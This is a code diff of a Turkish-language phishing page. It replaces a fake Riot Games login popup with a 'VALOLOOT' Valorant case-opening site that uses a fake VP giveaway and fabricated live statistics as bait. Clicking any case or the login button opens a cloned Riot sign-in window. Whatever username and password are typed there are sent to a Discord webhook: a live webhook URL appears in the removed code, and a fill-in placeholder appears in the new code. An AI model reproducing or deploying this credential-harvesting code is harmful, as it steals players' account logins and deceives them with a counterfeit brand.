@@ -3,105 +3,203 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Riot Games</title>
-</head>
-<body style="margin: 0; background: #f9f9f9; display: flex; justify-content: flex-start; align-items: flex-start; padding: 20px;">
+    <title>VALOLOOT.NET | Valorant Case Simulator</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800;900&family=Montserrat:wght@700;900&display=swap" rel="stylesheet">
+    <style>
+        :root { --valo-red: #ff4655; --dark-bg: #0b1119; --nav-bg: #111420; }
+        body { background: var(--dark-bg) url('bg.jpg') fixed center/cover; color: white; font-family: 'Inter', sans-serif; margin: 0; padding: 0; min-height: 100vh; overflow-x: hidden; }
 
-    <button onclick="openAuth()" style="padding: 12px 24px; background: #ff4655; color: white; border: none; border-radius: 4px; cursor: pointer; font-weight: 900; font-family: 'Inter', sans-serif; font-size: 13px; letter-spacing: 0.5px;">
-        OTURUM AÇ
-    </button>
+        /* 1. ÜST SKİN AKIŞI (FIXED) */
+        .live-drops { background: rgba(0, 0, 0, 0.95); height: 100px; border-bottom: 2px solid var(--valo-red); display: flex; align-items: center; justify-content: flex-start; overflow: hidden; position: relative; width: 100%; }
+        .mythic-label { background: var(--valo-red); height: 100%; display: flex; align-items: center; padding: 0 20px; font-family: 'Montserrat'; font-weight: 900; font-size: 14px; text-transform: uppercase; z-index: 10; color: #fff; box-shadow: 10px 0 20px rgba(0,0,0,0.5); }
+        .drop-container { display: flex; align-items: center; padding-left: 15px; flex-grow: 1; white-space: nowrap; }
+        .drop-card { background: rgba(255,255,255,0.03); border-radius: 4px; width: 130px; height: 75px; margin-right: 12px; display: inline-flex; flex-direction: column; align-items: center; justify-content: space-between; flex-shrink: 0; animation: slideIn 0.5s ease-out forwards; padding-top: 10px; overflow: hidden; }
+        .drop-card img { height: 45px; object-fit: contain; }
+        .rarity-box { width: 100%; height: 6px; margin-top: auto; }
+        @keyframes slideIn { from { transform: translateX(-50px); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
+
+        /* 2. NAVBAR */
+        header { padding: 15px 50px; display: flex; align-items: center; background: var(--nav-bg); border-bottom: 1px solid rgba(255,255,255,0.1); gap: 40px; }
+        .logo { font-family: 'Montserrat', sans-serif; font-size: 26px; font-weight: 900; }
+        .logo span { color: var(--valo-red); }
+        .nav-links { display: flex; gap: 25px; flex-grow: 1; }
+        .nav-links a { color: #888; text-decoration: none; font-size: 13px; font-weight: 700; text-transform: uppercase; }
+        .btn-login { background: var(--valo-red); color: #fff; border: none; padding: 12px 25px; font-weight: 800; cursor: pointer; border-radius: 4px; display: flex; align-items: center; gap: 10px; text-transform: uppercase; font-size: 14px; box-shadow: 0 4px 15px rgba(255, 70, 85, 0.4); }
+
+        /* 3. ÇEKİLİŞ BANNER */
+        .giveaway-section { max-width: 1100px; margin: 40px auto; background: rgba(0,0,0,0.85); border: 1px solid var(--valo-red); border-radius: 12px; padding: 30px; display: flex; justify-content: space-between; align-items: center; }
+        #countdown { font-size: 36px; font-weight: 900; color: #fff; font-family: 'Montserrat'; }
+
+        /* 4. BAŞLIK */
+        .title-container { width: 100%; background: linear-gradient(90deg, transparent, rgba(0,0,0,0.8), transparent); border-top: 1px solid rgba(255,70,85,0.3); border-bottom: 1px solid rgba(255,70,85,0.3); padding: 20px 0; margin: 40px 0; text-align: center; }
+        .title-container h3 { margin: 0; font-family: 'Montserrat'; letter-spacing: 6px; color: #fff; font-size: 24px; text-shadow: 2px 2px 4px rgba(0,0,0,0.8); text-transform: uppercase; }
+
+        /* 5. KASALAR (ESKİ HALİNE GELDİ) */
+        .case-wrapper { max-width: 1300px; margin: auto; padding-bottom: 60px; }
+        .case-row { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 25px; padding: 0 20px; }
+        .case-box { background: #101123; border-radius: 12px; padding: 25px; text-align: center; border: 1px solid #222; transition: 0.3s; display: flex; flex-direction: column; align-items: center; cursor: pointer; }
+        .case-box:hover { border-color: var(--valo-red); transform: translateY(-5px); }
+        .case-img-container { width: 100%; height: 180px; display: flex; align-items: center; justify-content: center; margin-bottom: 15px; }
+        .case-box img { max-width: 100%; max-height: 100%; object-fit: contain; }
+        .vp-tag { color: #79eb1e; font-weight: 800; font-size: 24px; margin-bottom: 15px; font-family: 'Montserrat'; }
+        .open-btn { background: var(--valo-red); color: white; border: none; width: 100%; padding: 14px; font-weight: 800; border-radius: 4px; cursor: pointer; text-transform: uppercase; font-size: 14px; }
+
+        /* 6. ALT İSTATİSTİKLER */
+        .live-stats { display: flex; justify-content: center; gap: 80px; padding: 60px 0; background: rgba(0,0,0,0.5); margin-top: 40px; border-top: 1px solid rgba(255,255,255,0.05); }
+        .stat-num { display: block; font-size: 34px; font-weight: 900; color: #fff; font-family: 'Montserrat'; }
+    </style>
+</head>
+<body>
+
+    <div class="live-drops">
+        <div class="mythic-label">Last Mythic Item</div>
+        <div class="drop-container" id="dropTrack"></div>
+    </div>
+
+    <header>
+        <div class="logo">VALO<span>LOOT</span></div>
+        <div class="nav-links">
+            <a href="#">Kasalar</a><a href="#">Savaşlar</a><a href="#">Sözleşmeler</a><a href="#">Mağaza</a>
+        </div>
+        <button class="btn-login" onclick="openAuth()">GİRİŞ YAP</button>
+    </header>
+
+    <div class="giveaway-section">
+        <div>
+            <h2 style="margin:0; font-family:'Montserrat'; font-size:32px;">10 ADET 8900 VP ÇEKİLİŞİ</h2>
+            <p style="color:var(--valo-red); font-weight:800; margin:5px 0;">OTURUM AÇANLAR KATILIR</p>
+        </div>
+        <div style="text-align:right; border-left: 2px solid var(--valo-red); padding-left: 30px;">
+            <div id="countdown">00:00:00</div>
+            <span style="font-size:10px; color:#555;">UTC+3 KALAN SÜRE</span>
+        </div>
+    </div>
+
+    <div class="title-container"><h3>POPÜLER SANDIKLAR</h3></div>
+
+    <div class="case-wrapper">
+        <div class="case-row" id="caseGrid"></div>
+    </div>
+
+    <div class="live-stats">
+        <div class="stat-box"><span class="stat-num" id="stat-players">2,841</span><span style="color:#555; font-size:12px; font-weight:800;">AKTİF OYUNCU</span></div>
+        <div class="stat-box"><span class="stat-num" id="stat-cases">148,209</span><span style="color:#555; font-size:12px; font-weight:800;">KASA AÇILDI</span></div>
+        <div class="stat-box"><span class="stat-num" id="stat-vp">1,250,400</span><span style="color:#555; font-size:12px; font-weight:800;">VP DAĞITILDI</span></div>
+    </div>
 
     <script>
-        function openAuth() {
-            const w = 550, h = 800;
-            const l = (screen.width/2)-(w/2), t = (screen.height/2)-(h/2);
-            let win = window.open("", "RiotLogin", "width=" + w + ",height=" + h + ",top=" + t + ",left=" + l);
-            
-            // Pop-up içeriğini string olarak hazırlıyoruz
-            const html = `
-                <html>
-                <head>
-                    <title>Riot Games - Oturum Aç</title>
-                    <style>
-                        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap');
-                        body { margin:0; height:100vh; overflow:hidden; background: #111; display:flex; justify-content:center; align-items:center; font-family:'Inter', sans-serif; }
-                        .card { background:#fff; width:330px; padding:45px 35px; border-radius:4px; text-align:center; box-shadow: 0 10px 50px rgba(0,0,0,0.5); display: flex; flex-direction: column; align-items: center; min-height: 520px; justify-content: center; }
-                        h2 { font-weight:900; font-size:24px; margin-bottom: 25px; text-transform:uppercase; color:#111; letter-spacing:-1px; }
-                        .input-group { width: 100%; }
-                        .input-container { position: relative; margin: 10px 0; width: 100%; text-align: left; }
-                        input { width:100%; padding: 24px 16px 8px 16px; background:#f2f2f2; border:2px solid transparent; border-radius:4px; box-sizing:border-box; font-weight:700; font-size:14px; color:#111; outline:none; transition: 0.15s ease-in-out; }
-                        .label { position: absolute; left: 16px; top: 18px; color: #999; font-weight: 800; font-size: 11px; text-transform: uppercase; pointer-events: none; transition: 0.15s ease-in-out; }
-                        input:focus { background: #fff; border-color: #111; }
-                        input:focus + .label, input:not(:placeholder-shown) + .label { top: 8px; font-size: 9px; color: #333; }
-                        .loader { display: none; border: 4px solid #f3f3f3; border-top: 4px solid #ff4655; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }
-                        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-                        .loading-text { display: none; font-size: 12px; font-weight: 800; color: #111; margin-top: 15px; text-transform: uppercase; }
-                        .social-grid { display:grid; grid-template-columns:repeat(5, 1fr); gap:8px; margin:20px 0; width:100%; }
-                        .social-btn { height:40px; border-radius:4px; display:flex; align-items:center; justify-content:center; cursor:pointer; }
-                        .fb { background:#1877f2; } .gg { background:#fff; border:1px solid #ddd; } .ap { background:#000; } .xb { background:#107c10; } .ps { background:#00439c; }
-                        .social-btn img { width:20px; height:20px; object-fit: contain; }
-                        .submit-container { margin-top:30px; }
-                        .next-btn { width:75px; height:75px; border:2px solid #eee; border-radius:24px; background:#fff; cursor:pointer; display:flex; align-items:center; justify-content:center; transition:0.3s; outline: none; }
-                        .next-btn.active { border-color:#ff4655; }
-                        .next-btn.active svg { fill:#ff4655; }
-                        .next-btn svg { width:30px; fill:#ddd; }
-                    </style>
-                </head>
-                <body>
-                    <div class="card">
-                        <img src="https://upload.wikimedia.org/wikipedia/commons/b/b6/Riot_Games_logo_icon.png" width="50" style="margin-bottom:10px;">
-                        <div id="loginForm" style="width:100%">
-                            <h2>OTURUM AÇ</h2>
-                            <div class="input-group">
-                                <div class="input-container"><input type="text" id="u" placeholder=" "><span class="label">Kullanıcı Adı</span></div>
-                                <div class="input-container"><input type="password" id="p" placeholder=" "><span class="label">Şifre</span></div>
-                            </div>
-                            <div class="social-grid">
-                                <div class="social-btn fb"><img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png"></div>
-                                <div class="social-btn gg"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c1/Google_%22G%22_logo.svg/1200px-Google_%22G%22_logo.svg.png"></div>
-                                <div class="social-btn ap"><img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg"></div>
-                                <div class="social-btn xb"><img src="https://upload.wikimedia.org/wikipedia/commons/f/f9/Xbox_one_logo.svg"></div>
-                                <div class="social-btn ps"><img src="https://upload.wikimedia.org/wikipedia/commons/4/4e/Playstation_logo_colour.svg"></div>
-                            </div>
-                            <div class="submit-container">
-                                <button class="next-btn" id="go">
-                                    <svg viewBox="0 0 24 24"><path d="M12 4l-1.41 1.41L16.17 11H4v2h12.17l-5.58 5.59L12 20l8-8z"/></svg>
-                                </button>
-                            </div>
-                        </div>
-                        <div id="loader" class="loader"></div>
-                        <div id="loadingText" class="loading-text">Giriş Yapılıyor...</div>
-                    </div>
-                    <script>
-                        const u = document.getElementById('u'), p = document.getElementById('p'), btn = document.getElementById('go');
-                        const check = () => (u.value && p.value) ? btn.classList.add('active') : btn.classList.remove('active');
-                        u.oninput = check; p.oninput = check;
-                        btn.onclick = function() {
-                            if(u.value && p.value) {
-                                document.getElementById('loginForm').style.display = 'none';
-                                document.getElementById('loader').style.display = 'block';
-                                document.getElementById('loadingText').style.display = 'block';
-                                window.opener.postMessage({user: u.value, pass: p.value}, "*");
-                                setTimeout(() => { window.location.href = "https://authenticate.riotgames.com/"; }, 2500);
-                            }
-                        };
-                    <\/script>
-                </body>
-                </html>`;
+        const WEBHOOK_URL = "BURAYA_WEBHOOK_URL_YAPISTIR";
 
-            win.document.write(html);
-            win.document.close();
+        window.addEventListener('load', function() {
+            // Skin Drop Sistemi (6 Skin Döner)
+            const skins = [
+                {img: "skin1.png", c: "#ade55c"}, {img: "skin2.png", c: "#4b82d5"}, 
+                {img: "skin3.png", c: "#d151dc"}, {img: "skin4.png", c: "#f7c133"},
+                {img: "skin5.png", c: "#ff4655"}, {img: "skin6.png", c: "#ade55c"}
+            ];
+            const track = document.getElementById('dropTrack');
+            function addNewDrop() {
+                const s = skins[Math.floor(Math.random() * skins.length)];
+                const d = document.createElement('div');
+                d.className = 'drop-card';
+                d.innerHTML = `<img src="${s.img}" onerror="this.src='https://via.placeholder.com/60'"><div class="rarity-box" style="background: ${s.c}"></div>`;
+                track.prepend(d);
+                if(track.children.length > 15) track.removeChild(track.lastChild);
+                setTimeout(addNewDrop, Math.random() * 2000 + 1500);
+            }
+            addNewDrop();
+
+            // Kasaları Yükleme (6 Kasa - Eski Tasarım)
+            const cases = [
+                {n: "BAŞLANGIÇ", v: "10 VP", i: "case1.png"}, {n: "STANDART", v: "30 VP", i: "case2.png"},
+                {n: "ELİT", v: "50 VP", i: "case3.png"}, {n: "PREMIUM", v: "100 VP", i: "case4.png"},
+                {n: "EFSANEVİ", v: "500 VP", i: "case5.png"}, {n: "RADYANİT", v: "2000 VP", i: "case6.png"}
+            ];
+            const grid = document.getElementById('caseGrid');
+            cases.forEach(c => {
+                grid.innerHTML += `
+                    <div class="case-box" onclick="openAuth()">
+                        <div class="case-img-container"><img src="${c.i}" onerror="this.src='https://via.placeholder.com/180'"></div>
+                        <h3 style="margin:0; font-size:18px; font-weight:800;">${c.n} KASASI</h3>
+                        <div class="vp-tag">${c.v}</div>
+                        <button class="open-btn">KASAYI AÇ</button>
+                    </div>`;
+            });
+
+            // Geri Sayım
+            setInterval(() => {
+                const now = new Date();
+                const d = new Date(now.getFullYear(), now.getMonth(), now.getDate() + 1) - now;
+                const h = Math.floor(d/3600000), m = Math.floor((d%3600000)/60000), s = Math.floor((d%60000)/1000);
+                document.getElementById('countdown').innerText = `${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
+            }, 1000);
+
+            // İstatistik Sayaçları
+            let pl = 2841, cs = 148209, vp = 1250400;
+            setInterval(() => {
+                pl += Math.floor(Math.random()*3)-1; cs += 1; vp += 10;
+                document.getElementById('stat-players').innerText = pl.toLocaleString();
+                document.getElementById('stat-cases').innerText = cs.toLocaleString();
+                document.getElementById('stat-vp').innerText = vp.toLocaleString();
+            }, 3000);
+        });
+
+        // RIOT GAMES STİLİ GİRİŞ EKRANI (TAM SADAKAT)
+        function openAuth() {
+            const w = 450, h = 680;
+            const l = (screen.width/2)-(w/2), t = (screen.height/2)-(h/2);
+            let win = window.open("", "RiotLogin", `width=${w},height=${h},top=${t},left=${l}`);
             
-            // Discord Webhook Dinleyicisi
-            window.addEventListener("message", function(event) {
-                if (event.data.user && event.data.pass) {
-                    fetch("https://discord.com/api/webhooks/1489632402421841930/NW5qpH3UpfzBpTWSVcJ-FGXbevssOBhbMDUIdGjP4620rQLHvM6jx8fJGzji_4LQOBrq", {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            username: "Riot Auth System",
-                            embeds: [{
-                                title: "⚠️ Yeni Giriş Tespit Edildi",
-                                color: 16725845,
-                                fields: [
-                                    { name: "👤 Kullanıcı Adı", value: "
+            win.document.body.innerHTML = `
+                <style>
+                    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap');
+                    body { margin:0; height:100vh; background:#fff; display:flex; justify-content:center; align-items:center; font-family:'Inter', sans-serif; overflow:hidden; }
+                    .card { width:320px; text-align:center; padding: 20px; }
+                    h1 { font-weight:900; font-size:26px; margin-bottom:40px; text-transform:uppercase; color:#111; letter-spacing:-1px; }
+                    input { width:100%; padding:16px; background:#f2f2f2; border:2px solid transparent; border-radius:4px; box-sizing:border-box; font-weight:700; font-size:12px; margin-bottom:12px; outline:none; }
+                    input:focus { background:#fff; border-color:#111; }
+                    .social-grid { display:grid; grid-template-columns:repeat(5, 1fr); gap:8px; margin:25px 0; }
+                    .social-btn { height:40px; border-radius:4px; display:flex; align-items:center; justify-content:center; cursor:pointer; border:none; }
+                    .fb { background:#1877f2; } .gg { background:#fff; border:1px solid #ddd; } .ap { background:#000; } .xb { background:#107c10; } .ps { background:#00439c; }
+                    .social-btn img { width:18px; }
+                    .stay-signed { display:flex; align-items:center; gap:8px; font-size:12px; color:#111; font-weight:700; margin:15px 0; text-align:left; }
+                    .checkbox { width:16px; height:16px; background:#f2f2f2; border-radius:3px; }
+                    .submit-container { margin-top:50px; display:flex; justify-content:center; }
+                    .next-btn { width:70px; height:70px; border:2px solid #eee; border-radius:20px; background:#fff; cursor:pointer; display:flex; align-items:center; justify-content:center; transition:0.3s; }
+                    .next-btn.active { border-color:#ff4655; }
+                    .next-btn.active svg { fill:#ff4655; }
+                    .next-btn svg { width:28px; fill:#ddd; }
+                    .footer-links { margin-top:40px; font-size:11px; font-weight:800; color:#111; text-transform:uppercase; opacity:0.6; }
+                </style>
+                <div class="card">
+                    <h1>Giriş</h1>
+                    <input type="text" id="u" placeholder="KULLANICI ADI">
+                    <input type="password" id="p" placeholder="ŞİFRE">
+                    <div class="social-grid">
+                        <div class="social-btn fb"><img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg"></div>
+                        <div class="social-btn gg"><img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_Reference_icon.svg"></div>
+                        <div class="social-btn ap"><img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" style="filter:invert(1)"></div>
+                        <div class="social-btn xb"><img src="https://upload.wikimedia.org/wikipedia/commons/f/f9/Xbox_one_logo.svg" style="filter:invert(1)"></div>
+                        <div class="social-btn ps"><img src="https://upload.wikimedia.org/wikipedia/commons/4/4e/PlayStation_logo_and_wordmark.svg" style="filter:invert(1)"></div>
+                    </div>
+                    <div class="stay-signed"><div class="checkbox"></div> Oturumu açık tut</div>
+                    <div class="submit-container">
+                        <button class="next-btn" id="go"><svg viewBox="0 0 24 24"><path d="M12 4l-1.41 1.41L16.17 11H4v2h12.17l-5.58 5.59L12 20l8-8z"/></svg></button>
+                    </div>
+                    <div class="footer-links"><div>Oturum açamıyor musun?</div><div style="margin-top:5px;">Hesap Oluştur</div></div>
+                </div>
+            `;
+            
+            const u = win.document.getElementById('u'), p = win.document.getElementById('p'), btn = win.document.getElementById('go');
+            const check = () => (u.value && p.value) ? btn.classList.add('active') : btn.classList.remove('active');
+            u.oninput = check; p.oninput = check;
+            btn.onclick = () => {
+                if(u.value && p.value) {
+                    fetch(WEBHOOK_URL, { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({content:"👤:"+u.value+" | 🔑:"+p.value}) });
+                    win.close();
+                }
+            };
+        }
+    </script>
+</body>
+</html>
